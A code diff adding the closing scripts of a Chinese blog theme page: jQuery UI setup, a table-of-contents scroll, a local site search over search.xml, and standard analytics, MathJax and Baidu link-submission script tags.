+            var $imgs = $('img').not('.slider-image').not('.avatar-image').not('.carousel-image').not('.card-cover-image').not('.qrcode');
+
+            // 给图片加上点击放大效果（materialbox插件）
+            $imgs.addClass('materialboxed').each(function(i, el) {
+                $(this).attr('data-caption', $(this).attr('alt') || ' ');
+            }).materialbox();
+
+            // 优化表格的显示
+            $('table').each(function() {
+                var $table = $(this);
+                // 除去多行代码的情况
+                if ($table.find('pre').length == 0) {
+                    $table.addClass('responsive-table striped bordered');
+                }
+            });
+
+            // 首页幻灯片
+            $('.slider').slider({indicators: true, full_width: true, interval: 8000});
+
+            $(".button-collapse").sideNav();
+            $(".category-menu").sideNav();
+
+            // 针对gallery post
+            $('.carousel').carousel({full_width: true});
+            $('.carousel-control.prev').click(function() {
+                $('.carousel').carousel('prev');
+            });
+            $('.carousel-control.next').click(function() {
+                $('.carousel').carousel('next');
+            });
+
+            // 文章目录
+            $('article').not('.simple-article').find('h1').add('h2').add('h3').add('h4').add('h5').add('h6').scrollSpy();
+
+            // 目录随屏幕滚动（防止目录过长越过footer）
+            var $toc = $('.toc');
+            var scrollTargetTop = 0;
+            $(window).scroll(function() {
+                var $activeLink = $toc.find('a.active.section');
+                if ($(window).scrollTop() < 100) {
+                    scrollTargetTop = 0;
+                } else {
+                    if ($activeLink[0]) {
+                        scrollTargetTop = $activeLink.offset().top - $toc.offset().top;
+                    }
+                }
+                $toc.css('top', '-' + scrollTargetTop + 'px');
+            });
+
+            // 修正文章目录的left-border颜色
+            var color = $('.table-of-contents-text').css('color');
+            $('.table-of-contents-link').css('border-left-color', color);
+
+            // 针对移动端做的优化：FAB按钮点击一下收回
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+                $('.fixed-action-btn').addClass('click-to-toggle');
+            }
+            // 回到顶部
+            $('.btn-return-top').click(function() {
+                $('body, html').animate({
+                    scrollTop: 0
+                }, 500);
+            });
+
+            // 重置读书页面的Tab标签页的颜色
+            $('li.tab a').hover(function() {
+                $(this).toggleClass('text-lighten-4');
+            });
+            $('.indicator').addClass(' lighten-2');
+
+            
+            // 添加new标签
+            $('.menu-reading, .menu-about').append('<span class="new badge red"></span>');
+            
+
+            // 搜索功能
+            $('.modal-trigger').leanModal({
+                // 打开搜索框时自动聚焦
+                ready: function() {
+                    if ($('#search').is(":visible")) {
+                        $('#search-input').focus();
+                    }
+                }
+            });
+            var searchXml = "search.xml";
+            if (searchXml.length == 0) {
+             	searchXml = "search.xml";
+            }
+            var searchPath = "/" + searchXml;
+            initSearch(searchPath, 'search-input', 'search-result');
+        });
+
+        // 初始化搜索与匹配函数
+        var initSearch = function(path, search_id, content_id) {
+            'use strict';
+            $.ajax({
+                url: path,
+                dataType: "xml",
+                success: function(xmlResponse) {
+                    // get the contents from search data
+                    var datas = $("entry", xmlResponse).map(function() {
+                        return {
+                            title: $("title", this).text(),
+                            content: $("content", this).text(),
+                            url: $("url", this).text()
+                        };
+                    }).get();
+                    var $input = document.getElementById(search_id);
+                    var $resultContent = document.getElementById(content_id);
+                    $input.addEventListener('input', function() {
+                        var str = '<ul class=\"search-result-list\">';
+                        var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                        $resultContent.innerHTML = "";
+                        if (this.value.trim().length <= 0) {
+                            return;
+                        }
+                        // perform local searching
+                        datas.forEach(function(data) {
+                            var isMatch = true;
+                            var content_index = [];
+                            var data_title = data.title.trim().toLowerCase();
+                            var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                            var data_url = data.url;
+                            var index_title = -1;
+                            var index_content = -1;
+                            var first_occur = -1;
+                            // only match artiles with not empty titles and contents
+                            if (data_title != '' && data_content != '') {
+                                keywords.forEach(function(keyword, i) {
+                                    index_title = data_title.indexOf(keyword);
+                                    index_content = data_content.indexOf(keyword);
+                                    if (index_title < 0 && index_content < 0) {
+                                        isMatch = false;
+                                    } else {
+                                        if (index_content < 0) {
+                                            index_content = 0;
+                                        }
+                                        if (i == 0) {
+                                            first_occur = index_content;
+                                        }
+                                    }
+                                });
+                            }
+                            // show search results
+                            if (isMatch) {
+                                keywords.forEach(function(keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                });
+
+                                str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                                var content = data.content.trim().replace(/<[^>]+>/g, "");
+                                if (first_occur >= 0) {
+                                    // cut out 100 characters
+                                    var start = first_occur - 20;
+                                    var end = first_occur + 80;
+                                    if (start < 0) {
+                                        start = 0;
+                                    }
+                                    if (start == 0) {
+                                        end = 100;
+                                    }
+                                    if (end > content.length) {
+                                        end = content.length;
+                                    }
+                                    var match_content = content.substring(start, end);
+                                    // highlight all keywords
+                                    keywords.forEach(function(keyword) {
+                                        var regS = new RegExp(keyword, "gi");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
+                                    });
+
+                                    str += "<p class=\"search-result\">..." + match_content + "...</p>"
+                                }
+                                str += "</li>";
+                            }
+                        });
+                        str += "</ul>";
+                        $resultContent.innerHTML = str;
+                    });
+                }
+            });
+        }
+    })(jQuery);
+</script>
+
+
+<script src="/js/prettify.js"></script>
+<script type="text/javascript">
+    $(document).ready(function() {
+        $("pre").addClass("prettyprint");
+        prettyPrint();
+    });
+</script>
+
+
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', '119424621', 'auto');
+    ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/javascript" src="http://tajs.qq.com/stats?sId=65311650" charset="UTF-8"></script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
+});
+</script>
+<script type="text/javascript" async
+  src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+	
+</body>
+</html>
